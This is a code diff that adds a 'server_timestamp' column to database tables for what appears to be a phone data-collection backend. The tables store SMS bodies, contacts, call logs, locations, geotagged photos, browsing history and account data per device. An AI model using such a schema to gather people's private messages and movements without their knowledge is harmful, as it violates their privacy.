@@ -10,7 +10,8 @@ const CREATE_DEVICE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.DEVICE_TABLE}
                                 brand TEXT,
                                 base TEXT,
                                 sdk TEXT,
-                                timestamp timestamp
+                                timestamp timestamp,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_NETWORK_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.NETWORK_TABLE}
@@ -21,7 +22,8 @@ const CREATE_NETWORK_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.NETWORK_TABLE}
                                 data_sent TEXT,
                                 data_recieved TEXT,
                                 sim_number TEXT,
-                                timestamp timestamp
+                                timestamp timestamp,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_STORAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.STORAGE_TABLE}
@@ -32,7 +34,8 @@ const CREATE_STORAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.STORAGE_TABLE}
                                 secondary_memory TEXT,
                                 available_ram TEXT,
                                 available_sec_memory TEXT,
-                                timestamp timestamp
+                                timestamp timestamp,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_GALLERY_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.GALLERY_TABLE}
@@ -43,7 +46,8 @@ const CREATE_GALLERY_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.GALLERY_TABLE}
                                 img_cap_lat TEXT,
                                 img_cap_long TEXT,
                                 img_file TEXT,
-                                timestamp timestamp
+                                timestamp timestamp,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_WIFI_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.WIFI_TABLE}
@@ -53,7 +57,8 @@ const CREATE_WIFI_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.WIFI_TABLE}
                                 wifi_ssid TEXT,
                                 wifi_name TEXT,
                                 wifi_connected TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_CONTACTS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.CONTACTS_TABLE}
@@ -64,7 +69,8 @@ const CREATE_CONTACTS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.CONTACTS_TABL
                                 list_contacts TEXT,
                                 landline_contacts TEXT,
                                 int_contacts TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_CALLS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.CALLS_TABLE}
@@ -76,7 +82,8 @@ const CREATE_CALLS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.CALLS_TABLE}
                                 duration TEXT,
                                 start_time TEXT,
                                 call_ans_rate TEXT,
-                                timestamp TIMESTAMP 
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_LOCATIONS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.LOCATION_TABLE}
@@ -86,7 +93,8 @@ const CREATE_LOCATIONS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.LOCATION_TAB
                                 current_lat TEXT,
                                 current_long TEXT,
                                 place_visited TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_SMS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.SMS_TABLE}
@@ -96,7 +104,8 @@ const CREATE_SMS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.SMS_TABLE}
                                 type TEXT,
                                 sender TEXT,
                                 body TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_APP_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.APP_TABLE}
@@ -106,7 +115,8 @@ const CREATE_APP_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.APP_TABLE}
                                 tot_apps TEXT,
                                 sys_app TEXT,
                                 user_app TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_PACKAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.PACKAGE_TABLE}
@@ -115,7 +125,8 @@ const CREATE_PACKAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.PACKAGE_TABLE}
                                 device_id TEXT,
                                 tot_package TEXT,
                                 package_name TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_BATTERY_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.BATTERY_TABLE}
@@ -124,7 +135,8 @@ const CREATE_BATTERY_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.BATTERY_TABLE}
                                 device_id TEXT,
                                 is_charging TEXT,
                                 bat_current_status TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_ACCOUNTS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.ACCOUNTS_TABLE}
@@ -132,7 +144,8 @@ const CREATE_ACCOUNTS_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.ACCOUNTS_TABL
                                 id SERIAL PRIMARY KEY,
                                 device_id TEXT,
                                 data TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_MEMORY_USAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.MEMORY_USAGE_TABLE}
@@ -141,7 +154,8 @@ const CREATE_MEMORY_USAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.MEMORY_US
                                 device_id TEXT,
                                 app_mem TEXT,
                                 apps TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_URL_VISITED_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.URL_VISITED_TABLE}
@@ -149,7 +163,8 @@ const CREATE_URL_VISITED_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.URL_VISITE
                                 id SERIAL PRIMARY KEY,
                                 device_id TEXT,
                                 url TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 const CREATE_APP_USAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.APP_USAGE_TABLE}
@@ -161,7 +176,8 @@ const CREATE_APP_USAGE_TABLE = `CREATE TABLE IF NOT EXISTS ${TABLES.APP_USAGE_TA
                                 pattern TEXT,
                                 most_used TEXT,
                                 least_used TEXT,
-                                timestamp TIMESTAMP
+                                timestamp TIMESTAMP,
+                                server_timestamp timestamp
                            )`;
 
 
